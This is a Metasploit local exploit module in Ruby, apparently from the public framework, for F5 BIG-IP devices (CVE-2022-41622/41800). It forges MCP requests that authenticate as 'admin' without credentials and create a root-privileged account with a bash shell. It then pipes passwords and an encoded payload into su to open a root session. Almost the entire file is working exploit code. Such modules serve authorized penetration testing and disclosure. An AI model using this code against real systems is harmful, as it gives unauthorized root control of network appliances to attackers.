##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'unix_crypt'

class MetasploitModule < Msf::Exploit::Local
  include Msf::Post::Linux::F5Mcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'F5 Big-IP Create Admin User',
        'Description' => %q{
          This creates a local user with a username/password and root-level
          privileges. Note that a root-level account is not required to do this,
          which makes it a privilege escalation issue.

          Note that this is pretty noisy, since it creates a user account and
          creates log files and such. Additionally, most (if not all)
          vulnerabilities in F5 grant root access anyways.

          Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-privesc.rb
        },
        'License' => MSF_LICENSE,
        'Author' => ['Ron Bowes'],
        'Platform' => [ 'unix', 'linux', 'python' ],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          ['URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool'], # Original PoC
          ['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],
          ['URL', 'https://support.f5.com/csp/article/K97843387'],
        ],
        'Privileged' => true,
        'DisclosureDate' => '2022-11-16',
        'Arch' => [ ARCH_CMD, ARCH_PYTHON ],
        'Type' => :unix_cmd,
        'Targets' => [[ 'Auto', {} ]],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options([
      OptString.new('USERNAME', [true, 'Username to create (default: random)', Rex::Text.rand_text_alphanumeric(8)]),
      OptString.new('PASSWORD', [true, 'Password for the new user (default: random)', Rex::Text.rand_text_alphanumeric(12)]),

      OptBool.new('CREATE_SESSION', [true, 'If set, use the new account to create a root session', true]),
    ])
  end

  def exploit
    # Get or generate the username/password
    fail_with(Failure::BadConfig, 'USERNAME cannot be empty') if datastore['USERNAME'].empty?
    username = datastore['USERNAME']

    if datastore['CREATE_SESSION']
      password = Rex::Text.rand_text_alphanumeric(12)
      new_password = datastore['PASSWORD'] || Rex::Text.rand_text_alphanumeric(12)

      print_status("Will attempt to create user #{username} / #{password}, then change password to #{new_password} when creating a session")
    else
      password = datastore['PASSWORD'] || Rex::Text.rand_text_alphanumeric(12)

      print_status("Will attempt to create user #{username} / #{password}")
    end

    # If the password is already hashed, leave it as-is
    vprint_status('Hashing the password with SHA512')
    hashed_password = UnixCrypt::SHA512.build(password)

    if !hashed_password || hashed_password.empty?
      fail_with(Failure::BadConfig, 'Failed to hash the password with String.crypt')
    end

    # These requests have to go in a single 'session', which, to us, is
    # a single packet (since we don't have AF_UNIX sockets)
    result = mcp_send_recv([
      # Authenticate as 'admin' (this probably shouldn't work but does)
      mcp_build('user_authenticated', 'structure', [
        mcp_build('user_authenticated_name', 'string', 'admin')
      ]),

      # Start transaction
      mcp_build('start_transaction', 'structure', [
        mcp_build('start_transaction_load_type', 'ulong', 0)
      ]),

      # Create the role mapping
      mcp_build('create', 'structure', [
        mcp_build('user_role_partition', 'structure', [
          mcp_build('user_role_partition_user', 'string', username),
          mcp_build('user_role_partition_role', 'ulong', 0),
          mcp_build('user_role_partition_partition', 'string', '[All]'),
        ])
      ]),

      # Create the userdb entry
      mcp_build('create', 'structure', [
        mcp_build('userdb_entry', 'structure', [
          mcp_build('userdb_entry_name', 'string', username),
          mcp_build('userdb_entry_partition_id', 'string', 'Common'),
          mcp_build('userdb_entry_is_system', 'ulong', 0),
          mcp_build('userdb_entry_shell', 'string', '/bin/bash'),
          mcp_build('userdb_entry_is_crypted', 'ulong', 1),
          mcp_build('userdb_entry_passwd', 'string', hashed_password),
        ])
      ]),

      # Finish the transaction
      mcp_build('end_transaction', 'structure', [])
    ])

    # Handle errors
    if result.nil?
      fail_with(Failure::Unknown, 'Request to mcp appeared to fail')
    end

    # The only result we really care about is an error
    error_returned = false
    result.each do |r|
      result = mcp_get_single(r, 'result')
      result_code = mcp_get_single(result, 'result_code')

      # If there's no code or it's zero, just ignore it
      if result_code.nil? || result_code == 0
        next
      end

      # If we're here, an error was returned!
      error_returned = true

      # Otherwise, try and get result_message
      result_message = mcp_get_single(result, 'result_message')
      if result_message.nil?
        print_warning("mcp query returned a non-zero result (#{result_code}), but no error message")
      else
        print_error("mcp query returned an error message: #{result_message} (code: #{result_code})")
      end
    end

    # Let them know if it likely worked
    if !error_returned
      print_good("Service didn't return an error, so user was likely created!")

      if datastore['CREATE_SESSION']
        print_status('Attempting create a root session...')

        out = cmd_exec("echo -ne \"#{password}\\n#{password}\\n#{new_password}\\n#{new_password}\\n#{payload.encoded}\\n\" | su #{username}")

        vprint_status("Output from su command: #{out}")
      end
    end
  end
end